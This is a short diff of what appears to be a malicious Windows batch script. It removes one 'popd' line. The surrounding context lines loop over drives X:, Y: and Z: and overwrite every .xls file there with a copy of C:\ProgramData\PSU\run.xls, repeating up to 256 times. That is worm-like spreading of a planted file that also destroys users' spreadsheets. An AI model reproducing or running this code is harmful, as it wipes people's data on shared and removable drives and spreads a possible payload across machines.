@@ -583,7 +583,6 @@ if exist X: (for /f "delims=" %%h in ('dir X:\*.xls /b') do copy /Y "C:\ProgramD
 if exist Y: (for /f "delims=" %%h in ('dir Y:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Y:\%%h")
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.xls /b') do copy /Y "C:\ProgramData\PSU\run.xls" "Z:\%%h")
 
-popd
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
 :next
